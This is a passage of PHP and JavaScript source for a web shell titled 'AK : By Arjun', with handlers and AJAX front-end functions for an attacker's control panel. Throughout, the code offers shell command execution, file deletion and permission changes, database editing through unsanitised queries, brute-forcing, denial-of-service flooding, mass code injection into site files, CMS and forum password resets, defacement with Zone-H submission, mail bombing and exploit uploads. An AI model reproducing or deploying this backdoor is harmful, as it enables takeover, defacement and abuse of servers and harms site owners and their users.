	$sql = mysql_query("SELECT `COLUMN_NAME` FROM `information_schema`.`COLUMNS` WHERE (`TABLE_SCHEMA` = '$dbname')  AND (`TABLE_NAME` = '$tablename')  AND (`COLUMN_KEY` = 'PRI');");
	$row = mysql_fetch_array($sql);
	$row = $row['COLUMN_NAME'];
	$rowid = $_POST[$row];
	
	$pResult = mysql_db_query( $dbname, "SHOW fields FROM $tablename" );
	$num = mysql_num_rows( $pResult );
	
	$rowcount = $num;
				
	$pResultLen = mysql_list_fields( $dbname, $tablename );

	for( $i = 0; $i < $num; $i++ ) 
	{
		$field = mysql_fetch_array( $pResult );
		$fieldname = $field["Field"];
		$arrdata = $_REQUEST[$fieldname];
	
		$str1 .= "".$fieldname . ",";
		$str2 .= "'".$arrdata . "',";
		$rowcount--;
		if($rowcount != 0)
		{
			//$str1 .= $fieldname . ",";
			//$str2 .= $arrdata . ",";
		}
	}
	$str1=eregi_replace(',$', '', $str1); 
	$str2=eregi_replace(',$', '', $str2); 
	$str = "INSERT INTO `$tablename` ($str1) VALUES ($str2);";
	mysql_query($str);
	
	?><div id="showsql"></div><?php
}
else if(isset($_GET['logoutdb']))
{
	setcookie("dbserver",time() - 60*60);
	setcookie("dbuser",time() - 60*60);
	setcookie("dbpass",time() - 60*60);
	header("Location:$self");
}
else if(isset($_POST['choice']))
{  
	if($_POST['choice'] == "delete") 
	{
		$actbox = $_POST["actbox"];
				
		foreach ($actbox as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{			
			if(is_file($v))
			{
				if(unlink($v))
					echo "<br><center><font class=txt>File $v Deleted Successfully</font></center>";
				else
					echo "<br><center>Cannot Delete File $v</center>";
			}	
			else if(is_dir($v))
			{
				rrmdir($v);
			}
		}
	}
	else if($_POST['choice'] == "chmod")
	{ ?>
		<form id="chform"><?php 
		$actbox1 = $_POST['actbox'];
		foreach ($actbox1 as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{ ?>
			<input type="hidden" name="actbox3[]" id="actbox3[]" value="<?php echo $v; ?>">
		<?php }
		?>
			<table align="center" border="3" style="width:40%; border-color:#333333;">
				<tr>
					<td style="height:40px" align="right">Change Permissions </td><td align="center"><input value="0755" name="chmode" class="sbox" /></td> 
				</tr>
				<tr>
					<td colspan="2" align="center" style="height:60px">
			<input type="button" onClick="myaction('changefileperms',chmode.value)" value="Change Permission" class="but" style="padding: 5px;" /></td>
				</tr>
			</table>
			
		</form>  <?php
	}
	else if($_POST['choice'] == "changefileperms")
	{
		if($_POST['chmode'] != null && is_numeric($_POST['chmode']))
		{
			$actbox = $_POST["actbox"];
			foreach ($actbox as $myv) 
			$myv = explode(",",$myv);
			foreach ($myv as $v) 
			{
				if(is_file($v) || is_dir($v))
				{
					$perms = 0; 
					for($i=strlen($_POST['chmode'])-1;$i>=0;--$i) 
						$perms += (int)$_POST['chmode'][$i]*pow(8, (strlen($_POST['chmode'])-$i-1)); 
					echo "<div align=left style=width:60%;>";
					if(@chmod($v,$perms))
						echo "<font class=txt>File $v Permissions Changed Successfully</font><br>";
					else
						echo "Cannot Change $v File Permissions<br>";
					echo "</div>";
				}
			}
				
		}
	}
	else if($_POST['choice'] == "compre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $myv) 
			$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{
			if(is_file($v))
			{
				$zip = new ZipArchive();
				$filename= basename($v) . '.zip';
				if(($zip->open($filename, ZipArchive::CREATE))!==true)
				{ echo '<br><font  size=3>Error: Unable to create zip file for $v</font>';}
				else {echo "<br><font class=txt size=3>File $v Compressed successfully</font>";}
				$zip->addFile(basename($v));
				$zip->close();
			}
			else if(is_dir($v))
			{
				if($os == "Linux")
				{
					$filename= basename($v);
					execmd("tar --create --recursion --file=$filename.tar $v");
					echo "<br><font class=txt size=3>File $v Compressed successfully as $v.tar</font>";
				}
			}
		}
	}
	else if($_POST['choice'] == "uncompre") 
	{
		$actbox = $_POST["actbox"];
		foreach ($actbox as $myv) 
		$myv = explode(",",$myv);
		foreach ($myv as $v) 
		{
			 if(is_file($v) || is_dir($v))
			 {
			 $zip = new ZipArchive;
			 $filename= basename($v);
			 $res = $zip->open($filename);
			 if ($res === TRUE) 
			 {
			 	 $pieces = explode(".",$filename);
				 $zip->extractTo($pieces[0]);
				 $zip->close();
				 echo "<br><font class=txt size=3>File $v Unzipped successfully</font>";
			 } else
				 echo "<br><font  size=3>Error: Unable to Unzip file $v</font>";
			 }
		}
	}
}
else if(isset($_GET['sitename']))
{
	$sitename = str_replace("http://","",$_GET['sitename']);
	$sitename = str_replace("http://www.","",$sitename);
	$sitename = str_replace("www.","",$sitename);
	$show = myexe("ls -la /etc/valiases/".$sitename);
	if(!empty($show))
		echo $show;
	else
		echo "Cannot get the username";
}
else if(isset($_GET['mydata']))
{
	listdatabase();
}
else if(isset($_GET['home']))
{
	mainfun($_GET['home']);
}
else if(isset($_GET['dir']))
{
	mainfun($_GET['myfilepath']);
}
else if(isset($_GET['mydirpath']))
{
	echo is_writable($_GET['mydirpath'])?"<font class=txt>&lt; writable &gt;</font>":"&lt; not writable &gt;";
}
else
{
?>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> 
<title>AK : By Arjun</title>
<script type="text/javascript">
checked = false;
var waitstate = "<center><marquee scrollamount=4 width=150>Wait....</marquee></center>";
function checkedAll () 
{
    if (checked == false){checked = true}else{checked = false}
	for (var i = 0; i < document.getElementById('myform').elements.length; i++) 
	{
	  document.getElementById('myform').elements[i].checked = checked;
	}
}
function urlchange(myfilepath)
{
	var mypath, mpath, i, t, j, r = "",myurl = "",splitter="";
	splitter = "<?php echo addslashes($directorysperator); ?>";
	mypath = mpath = myfilepath.split(splitter);
	<?php if($os == "Linux") { ?>
			r = "/";
			myurl = "<a href=javascript:void(0) onClick=\"changedir('dir','/')\">/</a>";
	<?php } ?>
	for (i = 0; i < mypath.length; i++) 
	{
		if(mypath[i] == "")
			continue;
   		r += mypath[i]+"<?php echo addslashes($directorysperator); ?>";
		r = r.replace(/\\/g,"\\\\");
		myurl += "<a href=javascript:void(0) onClick=\"changedir('dir','"+r+"\')\"><b>"+mypath[i]+"<?php echo addslashes($directorysperator); ?></b></a>";
	}
	return myurl;
}
function wrtblDIR(mydirpath)
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			for(i=0;i<=3;i++)
				document.getElementsByName("wrtble")[i].innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?&mydirpath="+mydirpath, true);
	ajaxRequest.send(null); 
}
function setpath(myfilpath)
{
	wrtblDIR(myfilpath);
	document.getElementById("path").value=myfilpath;
	document.getElementById("createfile").value=myfilpath;
	document.getElementById("createfolder").value=myfilpath;
	document.getElementById("createfolder").value=myfilpath;
	document.getElementById("exepath").value=myfilpath;
	document.getElementById("auexepath").value=myfilpath;
	document.getElementById("showdir").innerHTML="";
}
function changedir(myaction,myfilepath)
{
	var myurl = urlchange(myfilepath);
	
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			setpath(myfilepath);
			document.getElementById("crdir").innerHTML=myurl;
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"&myfilepath="+myfilepath, true);
	ajaxRequest.send(null); 
}
function gethome(myaction,mydir)
{
	var myurl = urlchange(mydir);
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
			setpath(mydir);
			document.getElementById("crdir").innerHTML=myurl;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"="+mydir, true);
	ajaxRequest.send(null); 
}
function getname(sitename)
{
	document.getElementById("showsite").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
				document.getElementById("showsite").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?sitename="+sitename, true);
	ajaxRequest.send(null); 
}
function myaction(myfileaction,chmode)
{
	var mytype = document.getElementsByName('actbox[]');
	var mychoice = new Array();
	
	for (var i = 0, length = mytype.length; i < length; i++)
	{
		if (mytype[i].checked)
			mychoice[i] = mytype[i].value;
	}
	
	var params = "choice="+myfileaction+"&chmode="+chmode+"&actbox[]="+mychoice;

	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function editdata()
{
	var result = "", // initialize list
       i,dbname,tablename;
   // iterate through arguments
   for (i = 1; i < arguments.length; i++)
   {
   	  if(i%2 == 0)
      	result += arguments[i]+'=';
	  else
	  	result += arguments[i]+'&';
   }
   result = result.slice(0, -1);
	
	dbname = arguments[3];
	tablename = arguments[5];
	var result=result.replace(/AK_/g,""); 
	var params = arguments[0]+"="+result;

	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			viewtables('listTables',dbname,tablename);
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function viewtables(action,dbname,tablename,rowid,arrdata,executequery,fieldname,page)
{
	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
				document.getElementById("showsql").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?action="+action+"&dbname="+dbname+"&tablename="+tablename+"&"+rowid+"="+arrdata+"&executemyquery="+executequery+"&fieldname="+fieldname+"&page="+page, true);
	ajaxRequest.send(null); 
}
function mydatabase(server,username,password)
{
	document.getElementById("showsql").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			mydatago();
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?executeit&server="+server+"&username="+username+"&password="+password, true);
	ajaxRequest.send(null); 
}
function mydatago()
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("datatable").style.display = 'none';
			document.getElementById("showsql").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?mydata", true);
	ajaxRequest.send(null); 
}
function bruteforce(prototype,serverport,login,dict)
{
	var mytype = document.getElementsByName('mytype');
	for (var i = 0, length = mytype.length; i < length; i++)
	{
		if (mytype[i].checked)
			break;
	}
	var getreverse = 0;
	if(document.getElementById('reverse').checked == true)
		getreverse = 1;
	else
		getreverse = 0;
	
	document.getElementById("showbrute").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showbrute").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?prototype="+prototype+"&serverport="+serverport+"&login="+login+"&dict="+dict+"&type="+mytype[i].value+"&reverse="+getreverse, true);
	ajaxRequest.send(null); 
}
function executemyfile(action,executepath,execute)
{
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+action+"&executepath="+executepath+"&execute="+execute, true);
	ajaxRequest.send(null); 
}
function maindata(myaction,dir)
{
	document.getElementById("showmaindata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmaindata").innerHTML=ajaxRequest.responseText;
			document.getElementById("showdir").innerHTML="";
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"="+myaction+"&dir="+dir, true);
	ajaxRequest.send(null); 
}
function manuallyscriptfn(passwd)
{
	var message = encodeURIComponent(passwd);
	var params = "scriptlocator=scriptlocator&passwd="+passwd;
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function my404page(message)
{
	var message = encodeURIComponent(message);
	var params = "404page=404page&message="+message;
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function executemyfn(executepath,executemycmd)
{
	document.getElementById("showexecute").innerHTML="Wait....";
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showexecute").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?executepath="+executepath+"&executemycmd="+executemycmd, true);
	ajaxRequest.send(null); 
}
function zoneh(defacer,hackmode,reason,domain)
{
	var domain = encodeURIComponent(domain);
	var params = "SendNowToZoneH=SendNowToZoneH&defacer="+defacer+"&hackmode="+hackmode+"&reason="+reason+"&domain="+domain;
	document.getElementById("showzone").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showzone").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function savemyfile(file,content)
{
	var content = encodeURIComponent(content);
	var params = "content="+content+"&file="+file;
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function renamefun(file,to)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?renamemyfile&file="+file+"&to="+to, true);
	ajaxRequest.send(null); 
}
function changeperms(chmode,myfilename)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?chmode="+chmode+"&myfilename="+myfilename, true);
	ajaxRequest.send(null); 
}
function defacefun(deface)
{
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			alert(ajaxRequest.responseText);
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?deface="+deface, true);
	ajaxRequest.send(null); 
}
function fileaction(myaction,myfilepath)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+myaction+"&myfilepath="+myfilepath, true);
	ajaxRequest.send(null); 
}
function bypassfun(funct,functvalue,optiontype)
{
	document.getElementById("showbyp").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showbyp").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?bypassit&"+funct+"="+functvalue+"&optiontype="+optiontype, true);
	ajaxRequest.send(null); 
}
function dos(target,ip,port,timeout,exTime,no0fBytes,multiplier)
{
	document.getElementById("showdos").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdos").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+target+"&ip="+ip+"&port="+port+"&timeout="+timeout+"&exTime="+exTime+"&multiplier="+multiplier+"&no0fBytes="+no0fBytes, true);
	ajaxRequest.send(null); 
}
function createfile(filecreator,filecontent)
{
	var mm = filecreator.slice(0, filecreator.lastIndexOf("<?php echo addslashes($directorysperator); ?>"));
	var filecontent = encodeURIComponent(filecontent);
	var params = "filecontent="+filecontent+"&filecreator="+filecreator;
	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			gethome('home',mm);
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function createdir(create,createfolder)
{
	document.getElementById("showdir").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdir").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+create+"="+createfolder, true);
	ajaxRequest.send(null); 
}
function codeinsert(code)
{
	var code = encodeURIComponent(code);
	var params = "getcode="+code;
	document.getElementById("showcode").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showcode").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function getmydata(mydata)
{
	document.getElementById("showmydata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmydata").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+mydata, true);
	ajaxRequest.send(null); 
}
function getdata(mydata,myfile)
{
	document.getElementById("showdata").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdata").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+mydata+"&myfile="+myfile, true);
	ajaxRequest.send(null); 
}
function getport(host,protocol,start,end)
{
	document.getElementById("showports").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showports").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?host=" + host + "&protocol=" + protocol, true);
	ajaxRequest.send(null); 
}
function changeforumpassword(forumpass,f1,f2,f3,f4,forums,tableprefix,ipbuid,newipbpass,username,newjoomlapass,uid,uname,newpass)
{
	document.getElementById("showchangepass").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showchangepass").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER['PHP_SELF']; ?>?forumpass&f1=" + f1 + "&f2=" + f2 + "&f3=" + f3 + "&f4=" + f4 + "&forums=" + forums + "&prefix=" + tableprefix + "&ipbuid=" + ipbuid + "&newipbpass=" + newipbpass + "&username=" + username + "&newjoomlapass=" + newjoomlapass + "&uid=" + uid + "&uname=" + uname + "&newpass=" + newpass, true);
	ajaxRequest.send(null); 
}
function forumdefacefn(index,f1,f2,f3,f4,defaceforum,tableprefix,siteurl,head,alll,f5)
{
	var index = encodeURIComponent(index);
	var params = "forumdeface="+defaceforum+"&index=" + index + "&f1=" + f1 + "&f2=" + f2 + "&f3=" + f3 + "&f4=" + f4 + "&tableprefix="+tableprefix+"&siteurl="+siteurl+"&head="+head+"&alll="+alll+"&f5="+f5;
	document.getElementById("showdeface").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showdeface").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function codeinjector(pathtomass,mode,filetype,injectthis)
{
	var injectthis = encodeURIComponent(injectthis);
	var params = "pathtomass="+pathtomass+"&mode=" + mode + "&filetype=" + filetype + "&injectthis=" + injectthis;
	document.getElementById("showinject").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showinject").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function sendmail(mailfunction,to,subject,message,from,times,padding)
{
	var message = encodeURIComponent(message);
	if(mailfunction == "massmailing")
		var params = "mailfunction="+mailfunction+"&to="+to+"&subject="+subject+"&from=" + from + "&message=" + message;
	else if(mailfunction == "dobombing")
		var params = "mailfunction="+mailfunction+"&to="+to+"&subject="+subject+"&times=" + times + "&padding=" + padding + "&message=" + message;
	document.getElementById("showmail").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmail").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function execode(code)
{
	var intext = document.getElementById('intext').checked;
	var message = encodeURIComponent(message);
	var params = "code="+code+"&intext="+intext;
	document.getElementById("showresult").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showresult").innerHTML=ajaxRequest.responseText;
		}
	}
	
	ajaxRequest.open("POST", "<?php echo $_SERVER["PHP_SELF"]; ?>", true);
	ajaxRequest.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
	ajaxRequest.send(params);
}
function malwarefun(malwork)
{
	var malpath = document.getElementById('createfile').value;
	document.getElementById("showmal").innerHTML="<center><marquee scrollamount=4 width=150>Wait....</marquee></center>";
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showmal").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?"+malwork+"&path="+malpath, true);
	ajaxRequest.send(null); 
}
function getexploit(wurl,path,functiontype)
{
	document.getElementById("showexp").innerHTML=waitstate;
	var ajaxRequest;
	ajaxRequest = new XMLHttpRequest();
	
	ajaxRequest.onreadystatechange = function()
	{
		if(ajaxRequest.readyState == 4)
		{
			document.getElementById("showexp").innerHTML=ajaxRequest.responseText;
		}
	}
		
	ajaxRequest.open("GET", "<?php echo $_SERVER["PHP_SELF"]; ?>?uploadurl&wurl="+wurl+"&functiontype="+functiontype+"&path="+path, true);
	ajaxRequest.send(null); 
}
function showMsg(msg)
{
	if(msg == 'smf')
	{
		document.getElementById('tableprefix').value="smf_";
		document.getElementById('fid').style.display='block';
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
	}
	if(msg == 'mybb')
	{
		document.getElementById('tableprefix').value="mybb_";
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
		document.getElementById('fid').style.display='block';
	}
	if(msg == 'ipb' || msg == 'vb')
	{
		document.getElementById('tableprefix').value="";
		document.getElementById('wpress').style.display='none';
		document.getElementById('joomla').style.display='none';
		document.getElementById('fid').style.display='block';
	}
	if(msg == 'wp')
	{
		document.getElementById('tableprefix').value="wp_";
		document.getElementById('wpress').style.display='block';
		document.getElementById('fid').style.display='none';
		document.getElementById('joomla').style.display='none';
	}
	if(msg == 'joomla')
	{
		document.getElementById('joomla').style.display='block';
		document.getElementById('tableprefix').value="jos_";
		document.getElementById('wpress').style.display='none';
		document.getElementById('fid').style.display='none';

	}
}
function checkforum(msg)
{
	if(msg == 'smf')
	{
		document.getElementById('tableprefix').value="smf_";
		document.getElementById('smfipb').style.display='block';
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('wordpres').style.display='none';
	}
	if(msg == 'phpbb')
	{	
		document.getElementById('tableprefix').value="phpb_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('wordpres').style.display='none';	
	}
	if(msg == 'mybb')
	{
		document.getElementById('tableprefix').value="mybb_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='none';
	}
	if(msg == 'vb')
	{
		document.getElementById('tableprefix').value="";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='none';
	}
	if(msg == 'ipb')
	{
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('tableprefix').value="";
		document.getElementById('wordpres').style.display='none';
		
	}
	if(msg == 'wp')
	{
		document.getElementById('tableprefix').value="wp_";
		document.getElementById('myjoomla').style.display='none';
		document.getElementById('smfipb').style.display='block';
		document.getElementById('wordpres').style.display='block';
	}
	if(msg == 'joomla')
	{
